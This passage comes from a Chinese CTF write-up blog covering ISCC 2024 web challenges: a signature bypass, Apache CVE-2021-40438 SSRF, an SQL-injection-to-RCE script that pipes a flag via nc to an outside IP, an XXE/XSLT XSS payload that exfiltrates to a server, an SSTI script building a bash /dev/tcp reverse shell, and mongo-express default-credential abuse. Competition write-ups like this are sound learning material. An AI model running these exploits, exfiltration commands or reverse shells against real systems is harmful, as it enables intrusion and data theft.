urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-built_in">return</span> json.dumps(task.Exec())<br> <br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>()<br> <br>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        <span class="hljs-built_in">return</span> urllib.urlopen(param).<span class="hljs-built_in">read</span>()[:50]<br>    except:<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br>def getSign(action, param):<br>    <span class="hljs-built_in">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br>def md5(content):<br>    <span class="hljs-built_in">return</span> hashlib.md5(content).hexdigest()<br> <br>def waf(param):<br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) or check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-built_in">return</span> True<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> False<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = False<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=9999)<br></code></pre></td></tr></table></figure><p>定位到关键代码</p><p>有三个路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;/&#x27;</span><br><span class="hljs-string">&#x27;/De1ta&#x27;</span><br><span class="hljs-string">&#x27;/geneSign&#x27;</span><br></code></pre></td></tr></table></figure><p>好懒累了，具体逻辑看原题吧我就说一下思路</p><p>使用if的判断</p><p>可以尝试用readscan绕过</p><p>param放要读的文件flag.txt</p><p>cookie里的action+GET里的param加密后要等于cookie里的sign</p><p>geneSign告诉我们param+关键字action的MD5加密是多少</p><p>那我们在&#x2F;geneSign页面传param&#x3D;flag.txtread就能算出来secret_key+flag.txt+readscan的值是多少，可以绕过弱比较</p><p>先获得sign的值</p><p>最终，回到<code>/De1ta</code>页面，<code>GET</code>传参<code>param=flag.txt</code>，<code>cookie</code>传参</p><p><img src="/../../images/iscc2024/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h3 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h3><p>我们原神玩家也是出息了。</p><p>作为一个op能直接答题那还是看一下源码吧，与熊论禅</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E.png" alt="原神"></p><p>就是简单的答题，输入正确答案可以问问题，尝试输入flag，告诉我们在flag.txt</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E1.png" alt="原神1"></p><p>以为直接是flag的，交完之后也不对啊。尝试扫了一下，并没有发现有什么异端，挨个进入，发现<a href="http://101.200.138.180:8080/index.jsp%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E6%90%9C%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89cve">http://101.200.138.180:8080/index.jsp，里面可以显示是服务器的版本号，搜看看有没有cve</a></p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E2.png" alt="原神2"></p><p>有漏洞可以利用，我们在虚拟机运行利用漏洞读取得到flag</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E3.png" alt="原神3"></p><h3 id="掉进阿帕奇的工资"><a href="#掉进阿帕奇的工资" class="headerlink" title="掉进阿帕奇的工资"></a>掉进阿帕奇的工资</h3><p>这题也难也是劳累</p><p>进入的页面是登陆界面，尝试用admin爆破密码进去的，爆破好久也是没进去，那就只能注册一个账号看看了。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%87.png" alt="阿帕奇"></p><p>？看看源码。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%871.png" alt="阿帕奇1"></p><p>还是学生就遭受了社会的毒打，要求是应该要是manager才能进入的啊</p><p>总结其实也不用改bp，就是页面注册的时候把信息都填好，验证问题选择第二个，然后修改密码选择回答问题，之后就可以登陆了</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%872.png" alt="阿帕奇2"></p><p>进去就是一个界面。</p><p>在工资界面上尝试一会好像是异或，输入ls和]B，可以爆出所有的内容</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%873.png" alt="阿帕奇3"></p><p>把所有的挨个试一下，结果应该是在Docfile </p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%874.png" alt="阿帕奇4"></p><p>一开始非预期可以直接用异或出的，环境修复之后就不行了，这题也考察的cve漏洞</p><p><a href="https://blog.csdn.net/qq_51398553/article/details/131299190">CVE-2021-40438</a>，按照流程也是最后出flag的</p><p>构造transfer.php?dashachun&#x3D;unix:A……A|<a href="http://secret.host/flag%E5%BE%97%E5%88%B0flag">http://secret.host/flag得到flag</a></p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%875.png" alt="阿帕奇5"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>这种全考反弹shell我i也是无奈了，最后的服务器环境也一直在爆，哎。</p><h3 id="这题我出不了了"><a href="#这题我出不了了" class="headerlink" title="这题我出不了了"></a>这题我出不了了</h3><p>这题我也真的出不了啊</p><p><a href="https://over-rainbow.cn/posts/2017-hitcon-sql-so-hard/">原题</a>，跟着过一遍吧，原理看文章就行</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload = &quot;union&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 47.122.22.16 5566`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">16</span>)<br>username = <span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: username+payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;AAAAAA&#x27;</span><br>                &#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>r = requests.post(<span class="hljs-string">&#x27;http://101.200.138.180:32031/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)<br><span class="hljs-built_in">print</span>(r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>在跑的时候要多连几下，可能连不起来，自己要买台云服务器方便一点，根据实际情况来</p><p><img src="/../../images/iscc2024/%E5%87%BA%E4%B8%8D%E4%BA%86.png" alt="出不了"></p><h3 id="一道普通的XSS题目"><a href="#一道普通的XSS题目" class="headerlink" title="一道普通的XSS题目"></a>一道普通的XSS题目</h3><p>显然这也并不简单,这是一道国际赛的原题，当时还是爆零了，我们也借鉴借鉴</p><p><a href="https://blog.ankursundara.com/dicectf23-writeups/">文章</a>，对比原文可以看出基本没有变化，也是跟着思路来一遍吧(这不就是炒冷饭，我太失败了)</p><p>改一下脚本，改个vps和端口，然后用node.js跑一下就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">xmls = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE a [</span><br><span class="hljs-string">   &lt;!ENTITY xxe SYSTEM  &quot;http://101.200.138.180:30280/flag&quot; &gt;]&gt;</span><br><span class="hljs-string">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="hljs-string">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="hljs-string">    &lt;HTML&gt;</span><br><span class="hljs-string">      &lt;HEAD&gt;</span><br><span class="hljs-string">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="hljs-string">      &lt;/HEAD&gt;</span><br><span class="hljs-string">      &lt;BODY&gt;</span><br><span class="hljs-string">        &lt;img&gt;</span><br><span class="hljs-string">          &lt;xsl:attribute name=&quot;src&quot;&gt;</span><br><span class="hljs-string">            http://这边填服务器和端口/?&amp;xxe;</span><br><span class="hljs-string">          &lt;/xsl:attribute&gt;</span><br><span class="hljs-string">        &lt;/img&gt;</span><br><span class="hljs-string">      &lt;/BODY&gt;</span><br><span class="hljs-string">    &lt;/HTML&gt;</span><br><span class="hljs-string">  &lt;/xsl:template&gt;</span><br><span class="hljs-string">&lt;/xsl:stylesheet&gt;`</span><br><br>xml = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:text/plain;base64,<span class="hljs-subst">$&#123;btoa(xmls)&#125;</span>&quot;?&gt;</span><br><span class="hljs-string">&lt;asdf&gt;&lt;/asdf&gt;`</span><br>xss = <span class="hljs-built_in">encodeURIComponent</span>(xml)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(xss)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/xss.png" alt="xss"></p><p>然后拼接脚本就行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://101.200.138.180:30280/adminbot?url=http://101.200.138.180:30280/?payload=%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%3Fxml-stylesheet%20type%3D%22text%2F<br>xsl%22%20href%3D%22data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2B<br>CjwhRE9DVFlQRSBhIFsKICAgPCFFTlRJVFkgeHhlIFNZU1RFTSAgImh0dHA6Ly8xMDEuMjAwLjEzOC4x<br>ODA6MzAyODAvZmxhZyIgPl0%2BCjx4c2w6c3R5bGVzaGVldCB4bWxuczp4c2w9Imh0dHA6Ly93d3cudz<br>Mub3JnLzE5OTkvWFNML1RyYW5zZm9ybSIgdmVyc2lvbj0iMS4wIj4KICA8eHNsOnRlbXBsYXRlIG1hdG<br>NoPSIvYXNkZiI%2BCiAgICA8SFRNTD4KICAgICAgPEhFQUQ%2BCiAgICAgICAgPFRJVExFPjwvVElUTE<br>U%2BCiAgICAgIDwvSEVBRD4KICAgICAgPEJPRFk%2BCiAgICAgICAgPGltZz4KICAgICAgICAgIDx4c2<br>w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCiAgICAgICAgICAgIGh0dHA6Ly80Ny4xMjIuMjIuMTY6ODA4<br>MC8%2FJnh4ZTsKICAgICAgICAgIDwveHNsOmF0dHJpYnV0ZT4KICAgICAgICA8L2ltZz4KICAgICAgPC<br>9CT0RZPgogICAgPC9IVE1MPgogIDwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D%2<br>2%3F%3E%0A%3Casdf%3E%3C%2Fasdf%3E<br><br></code></pre></td></tr></table></figure><p>多尝试几次理论上火狐也是可以传的我试过了</p><p><img src="/../../images/iscc2024/xss1.png" alt="xss1"></p><h3 id="回来吧永远滴神"><a href="#回来吧永远滴神" class="headerlink" title="回来吧永远滴神"></a>回来吧永远滴神</h3><p>呜呜呜，我再也不看英雄联盟了。</p><p>首先的界面是需要填空的，搜索一下</p><p><img src="/../../images/iscc2024/yyds.png" alt="yyds"></p><p>填空就行，然后进入一个页面</p><p><img src="/../../images/iscc2024/yyds1.png" alt="yyds1"></p><p>好像是模板注入，看不了源码，view-source也看不了，用bp抓一下内容</p><p><img src="/../../images/iscc2024/yyds2.png" alt="yyds2"></p><p>整数这块有点问题噢，后面还有等于，赛博厨子一把梭,先base64再转hex得到</p><p><img src="/../../images/iscc2024/yyds3.png" alt="yyds3"></p><p>通过分析flag应该是拼接的内容，我们再看看原来的，尝试模板注入看看</p><p><img src="/../../images/iscc2024/yyds4.png" alt="yyds4"></p><p>有内容的，那就尝试写个脚本看看吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> fenjing <span class="hljs-keyword">import</span> exec_cmd_payload<br><br>url = <span class="hljs-string">&quot;http://101.200.138.180:16356/evlelLL/646979696775616e&quot;</span><br>cookies = &#123;<br>    <span class="hljs-string">&#x27;session&#x27;</span>: <span class="hljs-string">&#x27;eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.Zk7ADA.GKdiBAKEeHRKoMPRWoSoRkaaH2c&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@functools.lru_cache(<span class="hljs-params">maxsize=<span class="hljs-number">1000</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">payload: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;检查字符串是否能通过WAF。如果能通过，返回True；否则返回False。&quot;&quot;&quot;</span><br>    time.sleep(<span class="hljs-number">0.02</span>)  <span class="hljs-comment"># 防止请求发送过多</span><br>    <span class="hljs-keyword">try</span>:<br>        resp = requests.post(url, cookies=cookies, timeout=<span class="hljs-number">10</span>, data=&#123;<span class="hljs-string">&quot;iIsGod&quot;</span>: payload&#125;)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;大胆&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text<br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求异常: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    shell_payload, will_print = exec_cmd_payload(<br>        waf, <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/服务器/端口 0&gt;&amp;1&quot;&#x27;</span><br>    )<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> will_print:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这个payload不会产生回显！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;shell_payload=&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>也是概率性的事情</p><p><img src="/../../images/iscc2024/yyds5.png" alt="yyds5"></p><p>讲改内容输入到页面的内容，反弹shell</p><p><img src="/../../images/iscc2024/yyds6.png" alt="yyds6"></p><p>还有一部分的内容估计就在app.py里面了，是个很长内容的代码</p><p><img src="/../../images/iscc2024/yyds7.png" alt="yyds7"></p><p>具体定位到key和偏移值和密文，写个脚本得到答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python">![yyds8](../../images/iscc2024/yyds8.png)<span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    ECB = <span class="hljs-number">0x01</span><br>    CBC = <span class="hljs-number">0x02</span><br>    CFB = <span class="hljs-number">0x03</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv=<span class="hljs-literal">None</span></span>):<br>        self.BLOCK_SIZE = <span class="hljs-number">64</span>  <span class="hljs-comment"># Block size in bits</span><br>        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), self.BLOCK_SIZE // <span class="hljs-number">16</span>)]<br>        self.DELTA = <span class="hljs-number">0x9e3779b9</span><br>        self.IV = iv<br>        self.ROUNDS = <span class="hljs-number">64</span><br>        self.mode = self._determine_mode(iv)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_determine_mode</span>(<span class="hljs-params">self, iv</span>):<br>        <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Mode.ECB<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(iv) * <span class="hljs-number">8</span> == self.BLOCK_SIZE:<br>            <span class="hljs-keyword">return</span> Mode.CBC<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Mode.CFB<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_xor</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(_a ^ _b <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        c0 = b2l(block[:<span class="hljs-number">4</span>])<br>        c1 = b2l(block[<span class="hljs-number">4</span>:])<br>        <span class="hljs-built_in">sum</span> = (self.DELTA * self.ROUNDS) &amp; mask<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            c1 -= ((c0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c1 &amp;= mask<br>            c0 -= ((c1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (c1 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (c1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(self.ROUNDS - i - <span class="hljs-number">1</span> + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            c0 &amp;= mask<br>            <span class="hljs-built_in">sum</span> -= self.DELTA<br><br>        <span class="hljs-keyword">return</span> l2b((c0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | c1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_encrypt_block</span>(<span class="hljs-params">self, block</span>):<br>        m0 = b2l(block[:<span class="hljs-number">4</span>])<br>        m1 = b2l(block[<span class="hljs-number">4</span>:])<br>        mask = (<span class="hljs-number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) - <span class="hljs-number">1</span><br>        <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.ROUNDS):<br>            <span class="hljs-built_in">sum</span> += self.DELTA<br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[i % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m1 + <span class="hljs-built_in">sum</span>) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">1</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m0 &amp;= mask<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + self.KEY[(i + <span class="hljs-number">2</span>) % <span class="hljs-built_in">len</span>(self.KEY)]) ^ (m0 + <span class="hljs-built_in">sum</span>) ^ (<br>                        (m0 &gt;&gt; <span class="hljs-number">5</span>) + self.KEY[(i + <span class="hljs-number">3</span>) % <span class="hljs-built_in">len</span>(self.KEY)])<br>            m1 &amp;= mask<br><br>        <span class="hljs-keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="hljs-number">2</span>)) | m1)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_ecb</span>(<span class="hljs-params">self, blocks</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;&#x27;</span>.join(self._decrypt_block(block) <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cbc</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            decrypted_block = self._decrypt_block(block)<br>            plaintext_block = self._xor(prev_block, decrypted_block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_decrypt_cfb</span>(<span class="hljs-params">self, blocks</span>):<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            output = self._encrypt_block(prev_block)<br>            plaintext_block = self._xor(output, block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, ciphertext</span>):<br>        block_size_bytes = self.BLOCK_SIZE // <span class="hljs-number">8</span><br>        blocks = [ciphertext[i:i + block_size_bytes] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), block_size_bytes)]<br><br>        <span class="hljs-keyword">if</span> self.mode == Mode.ECB:<br>            plaintext = self._decrypt_ecb(blocks)<br>        <span class="hljs-keyword">elif</span> self.mode == Mode.CBC:<br>            plaintext = self._decrypt_cbc(blocks)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/yyds8.png" alt="yyds8"></p><p>一共得到四个部分拼接起来看看可能是栅栏，我们用在线枚举得到答案</p><p><img src="/../../images/iscc2024/yyds9.png" alt="yyds9"></p><h3 id="实战阶段一"><a href="#实战阶段一" class="headerlink" title="实战阶段一"></a>实战阶段一</h3><p>这个cve漏洞完全跟着网上一篇文章来就可以成功了，，也说一下</p><p><a href="https://www.cnblogs.com/arrest/articles/17529877.html">文章</a>，跟着来就行了</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%98.png" alt="实战"></p><p>先尝试看看flag里面有没有内容，然后注意到了cve漏洞，去具体搜索一下看看</p><p>mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登<br>录，或者目标服务器没有修改默认的账号密码（ admin:pass ），则可以执行任意node.js代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Authorization: Basic YWRtaW46cGFzcw==<br></code></pre></td></tr></table></figure><p>改个success+账户名就行</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%981.png" alt="实战1"></p><p>总结：虽然是炒冷饭，还是记录一下吧，没什么好说的，人民的好比赛。（劳累.jpg</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
